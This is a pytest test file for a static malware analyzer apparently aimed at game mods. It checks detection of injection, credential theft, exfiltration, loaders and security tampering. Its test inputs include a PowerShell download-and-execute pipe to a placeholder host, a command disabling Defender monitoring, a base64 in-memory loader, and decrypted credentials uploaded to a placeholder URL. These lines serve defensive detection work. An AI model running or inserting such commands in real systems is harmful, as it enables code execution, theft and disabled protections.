"""Behavioral regressions built exclusively from inert synthetic bytes."""

from __future__ import annotations

import json
from types import SimpleNamespace

import pytest

from malguard_core.adapters import import_capa_json
from malguard_core.budget import BudgetLedger
from malguard_core.gta_context import identify_target_context
from malguard_core.model import CoverageState, EvidenceDomain, ErrorCode
from malguard_core.native import analyze as native_analyze, normalize_api
from malguard_core.scripts import analyze as script_analyze, lex_source, reconstruct_constants
from tests.builders.behavior import (
    INJECTION_APIS, credential_transfer, encoded_powershell, gta_trainer_source,
    lua_remote_loader, native_strings, source_credential_transfer,
)


def native(data: bytes, imports: tuple[str, ...] = ()):
    values = tuple(SimpleNamespace(text=value.decode("ascii"), offset=0, decoded=False) for value in data.split(b"\0") if value)
    return native_analyze(data, "artifact", "plugin.asi", BudgetLedger(), values, {"imports": list(imports), "is_dll": True})


def families(result, domain=EvidenceDomain.HARM):
    return {item.family for item in result.evidence if item.domain == domain}


@pytest.mark.parametrize("value,expected", [("kernel32.dll!CreateProcessW", "createprocess"), ("_WriteProcessMemory@20", "writeprocessmemory"), ("GetProcAddress", "getprocaddress"), ("send", "send")])
def test_normalized_apis(value, expected):
    assert normalize_api(value) == expected


def test_injection_chain_counts_one_harm_family():
    result = native(native_strings(INJECTION_APIS + ("chrome.exe",)), INJECTION_APIS)
    assert families(result) == {"PROCESS_INJECTION"}
    assert any(item.rule_id == "native.injection.chain" and item.reliability == 1 for item in result.evidence)


@pytest.mark.parametrize("api", ["VirtualAlloc", "Process.Start", "WriteProcessMemory", "GetAsyncKeyState", "CreateRemoteThread", "HttpSendRequestW"])
def test_lone_api_does_not_imply_harm(api):
    assert not families(native(native_strings((api,)), (api,)))


def test_legit_asi_hooks_are_context_only():
    result = native(native_strings(("ScriptHookV.dll", "GTA5.exe", "VirtualProtect", "scriptRegister", "nativeCall")), ("VirtualProtect", "scriptRegister", "nativeCall"))
    assert not families(result)
    assert "GAME_PROCESS_MODIFICATION" in families(result, EvidenceDomain.CONTEXT)


def test_native_game_name_cannot_prove_scope():
    result = native(native_strings(("OpenProcess", "WriteProcessMemory", "GTA5.exe")), ("OpenProcess", "WriteProcessMemory"))
    assert not result.facts["gta_only"]
    assert families(result) == {"PROCESS_INJECTION"}


def test_injection_raw_evidence_survives_missing_pe_facts():
    result = native(native_strings(INJECTION_APIS))
    assert families(result) == {"PROCESS_INJECTION"}
    assert any(item.effective_weight >= 16 for item in result.evidence)


def test_credential_and_transfer_are_independent_families():
    result = native(credential_transfer())
    assert families(result) == {"CREDENTIAL_ACCESS", "EXFILTRATION"}


def test_game_context_does_not_suppress_credentials():
    result = native(credential_transfer() + native_strings(("GTA5.exe", "ScriptHookV.dll")))
    assert {"CREDENTIAL_ACCESS", "EXFILTRATION"}.issubset(families(result))


def test_browser_path_alone_does_not_imply_harm():
    assert not families(native(native_strings((r"C:\Users\Example\AppData\Local\Google\Chrome\Login Data",))))


def test_keylogging_requires_capture_marker_and_sink():
    result = native(native_strings(("GetAsyncKeyState", "WriteFile", "keylog", "VK_RETURN")))
    assert "KEYLOGGING" in families(result)


def test_persistence_has_registry_mechanism():
    result = native(native_strings(("RegSetValueExW", r"Software\Microsoft\Windows\CurrentVersion\Run")))
    assert "PERSISTENCE" in families(result)


def test_api_resolution_and_anti_debug_are_opacity():
    result = native(native_strings(("LoadLibraryA", "GetProcAddress", "IsDebuggerPresent", "debugger")))
    assert not families(result)
    assert families(result, EvidenceDomain.OPACITY) == {"DYNAMIC_API_RESOLUTION", "ANTI_DEBUG_VM"}


@pytest.mark.parametrize("values", [
    ("BitBlt", "GetDIBits", "WinHttpSendRequest", "POST"),
    ("OpenClipboard", "GetClipboardData", "WinHttpSendRequest", "POST", "CF_UNICODETEXT"),
])
def test_capture_transfer_is_an_exfiltration_capability(values):
    assert "EXFILTRATION" in families(native(native_strings(values), values))


@pytest.mark.parametrize("values", [("BitBlt", "GetDIBits"), ("OpenClipboard", "GetClipboardData")])
def test_capture_without_sink_is_context_only(values):
    assert not families(native(native_strings(values), values))


def test_native_budget_failure_is_reproducible():
    result = native_analyze(b"abc", "a", "a.asi", BudgetLedger({"parser_iterations": 0}), ())
    assert result.state == CoverageState.SKIPPED_LIMIT
    assert result.errors == (ErrorCode.ITERATION_BUDGET_EXHAUSTED,)


@pytest.mark.parametrize("source", [
    'local x = 3; print("hello")',
    'PerformHttpRequest("https://example.invalid/version", function(s,b,h) print(b) end)',
    '-- PerformHttpRequest("https://example.invalid/a", function(s,b,h) loadstring(b) end)\nprint("hello")',
    'print("PerformHttpRequest loadstring(body) Set-MpPreference -DisableRealtimeMonitoring $true")',
])
def test_benign_lua_lookalikes(source):
    result = script_analyze(source.encode("ascii"), "a", "mod.lua", BudgetLedger())
    assert not families(result)


@pytest.mark.parametrize("sink", ["loadstring(body)", '_G["load" .. "string"](body)', '_G[string.char(108,111,97,100,115,116,114,105,110,103)](body)'])
def test_lua_remote_code_dataflow(sink):
    assert "REMOTE_CODE_EXECUTION" in families(script_analyze(lua_remote_loader(sink), "a", "mod.lua", BudgetLedger()))


def test_http_and_unrelated_dynamic_code_is_unresolved_opacity():
    source = b'local version = http.get("https://example.invalid/version"); loadstring("return 42")'
    result = script_analyze(source, "a", "mod.lua", BudgetLedger())
    assert not families(result)
    assert "OBFUSCATION" in families(result, EvidenceDomain.OPACITY)


def test_powershell_download_execute_pipe():
    source = b'iwr "https://example.invalid/a" | iex'
    assert "REMOTE_CODE_EXECUTION" in families(script_analyze(source, "a", "loader.ps1", BudgetLedger()))


def test_encoded_powershell_is_decoded_statically():
    result = script_analyze(encoded_powershell(), "a", "launch.cmd", BudgetLedger())
    assert "REMOTE_CODE_EXECUTION" in families(result)
    assert result.facts["encoded_command_decoded"]


@pytest.mark.parametrize("suffix,source", [
    (".cs", 'using GTA; var client = new HttpClient(); client.GetAsync("https://example.invalid/version");'),
    (".cs", 'Process.Start("notepad.exe");'),
    (".vb", 'Dim p = "Login Data"'),
    (".vbs", 'msgbox "Execute request.ResponseText"'),
    (".ps1", '# Set-MpPreference -DisableRealtimeMonitoring $true\nWrite-Host "hello"'),
    (".cmd", 'REM schtasks /create /tn example\necho hello'),
    (".xml", '<!-- Set-MpPreference -DisableRealtimeMonitoring $true --><settings/>'),
])
def test_source_benign_lookalikes(suffix, source):
    result = script_analyze(source.encode("ascii"), "a", "mod" + suffix, BudgetLedger())
    assert not families(result)


def test_source_trainer_scoped_by_pid_and_handle():
    result = script_analyze(gta_trainer_source(), "a", "trainer.cs", BudgetLedger())
    assert result.facts["gta_only"]
    assert result.facts["classification_tags"] == ["HACKTOOL_PUA"]
    assert not families(result)


def test_source_mixed_trainer_cannot_use_game_scope():
    result = script_analyze(gta_trainer_source(True), "a", "trainer.cs", BudgetLedger())
    assert not result.facts["gta_only"]
    assert "PROCESS_INJECTION" in families(result)


def test_source_unknown_second_handle_cannot_use_game_scope():
    source = gta_trainer_source() + b"WriteProcessMemory(other, address, bytes, length, out written);"
    result = script_analyze(source, "a", "trainer.cs", BudgetLedger())
    assert not result.facts["gta_only"]
    assert "PROCESS_INJECTION" in families(result)


def test_source_unknown_second_process_cannot_use_game_scope():
    source = gta_trainer_source() + b"var other = OpenProcess(access, false, unknownPid); WriteProcessMemory(other, address, bytes, length, out written);"
    result = script_analyze(source, "a", "trainer.cs", BudgetLedger())
    assert not result.facts["gta_only"]
    assert "PROCESS_INJECTION" in families(result)


@pytest.mark.parametrize("extra", [b"handle = other;", b"target.Id = otherPid;", b"WriteProcessMemory((IntPtr)unknown, address, bytes, length, out written);", b"Retarget(ref handle);"])
def test_retargeting_and_unresolved_handles_cancel_gta_scope(extra):
    source = gta_trainer_source() + extra
    result = script_analyze(source, "a", "trainer.cs", BudgetLedger())
    assert not result.facts["gta_only"]


def test_source_credential_transfer_has_two_harm_families():
    result = script_analyze(source_credential_transfer(), "a", "script.cs", BudgetLedger())
    assert families(result) == {"CREDENTIAL_ACCESS", "EXFILTRATION"}


def test_unrelated_post_does_not_inflate_credential_access():
    source = source_credential_transfer().replace(b", clear)", b", version)")
    result = script_analyze(source, "a", "script.cs", BudgetLedger())
    assert families(result) == {"CREDENTIAL_ACCESS"}


def test_credential_documentation_does_not_join_unrelated_decryption():
    source = b'var docs = "password_value"; var raw = File.ReadAllBytes("settings.enc"); var clear = ProtectedData.Unprotect(raw, null, scope); client.UploadData("https://example.invalid/version", clear);'
    assert not families(script_analyze(source, "a", "mod.cs", BudgetLedger()))


def test_source_loader_chain():
    source = b'var raw = Convert.FromBase64String(payload); var assembly = Assembly.Load(raw); assembly.GetMethod("Initialize").Invoke(null, null);'
    assert "LOADER_IN_MEMORY_EXECUTION" in families(script_analyze(source, "a", "script.cs", BudgetLedger()))


def test_enabling_security_monitoring_is_not_tampering():
    source = b"Set-MpPreference -DisableRealtimeMonitoring $false"
    assert not families(script_analyze(source, "a", "mod.ps1", BudgetLedger()))


def test_disabling_security_monitoring_is_tampering():
    source = b"Set-MpPreference -DisableRealtimeMonitoring $true"
    assert families(script_analyze(source, "a", "mod.ps1", BudgetLedger())) == {"SECURITY_TAMPERING"}


def test_lua_bytecode_blocks_complete_coverage():
    result = script_analyze(b"\x1bLua\x53\0\0", "a", "mod.lua", BudgetLedger())
    assert result.state == CoverageState.PARTIAL
    assert not families(result)


def test_lexical_strings_and_comments_are_different():
    text = '-- loadstring(body)\nprint("-- allowed literal")'
    result = lex_source(text, ".lua", BudgetLedger())
    assert "loadstring" not in result.text
    assert "-- allowed literal" in result.literals
    assert "allowed" not in result.code


def test_constant_reconstruction_does_not_execute():
    constants = reconstruct_constants('"load" .. "string"; string.char(65,66,67)', BudgetLedger())
    assert "loadstring" in constants
    assert "ABC" in constants


def test_gta_string_inside_documentation_cannot_prove_scope():
    source = gta_trainer_source().decode("ascii")
    code = " " * len(source)
    assert not identify_target_context(source, True, code).gta_only


def test_script_budget_retains_completed_evidence_before_decode_failure():
    source = b'iwr "https://example.invalid/a" | iex\n' + encoded_powershell()
    result = script_analyze(source, "a", "loader.ps1", BudgetLedger({"decoded_candidates": 0}))
    assert result.state == CoverageState.SKIPPED_LIMIT
    assert "REMOTE_CODE_EXECUTION" in families(result)


def test_capa_import_is_context_only_and_hash_bound():
    identity = "0" * 64
    payload = json.dumps({"meta": {"version": "fixture", "sample": {"sha256": identity}}, "rules": {"fixture capability": {"matches": [[]]}}}).encode()
    result = import_capa_json(payload, "a", identity, BudgetLedger())
    assert not families(result)
    assert result.facts["capa_rules"] == ["fixture capability"]
    with pytest.raises(ValueError, match="identity"):
        import_capa_json(payload, "a", "1" * 64, BudgetLedger())


@pytest.mark.parametrize("payload", [b"[]", b"{", b'{"meta":{},"rules":{},"verdict":"SAFE"}', b'{"meta":{},"rules":[]}', b'{"meta":{},"meta":{},"rules":{}}', b'{"meta":{"score":NaN},"rules":{}}'])
def test_capa_malformed_documents_are_rejected(payload):
    with pytest.raises(ValueError):
        import_capa_json(payload, "a", "0" * 64, BudgetLedger())
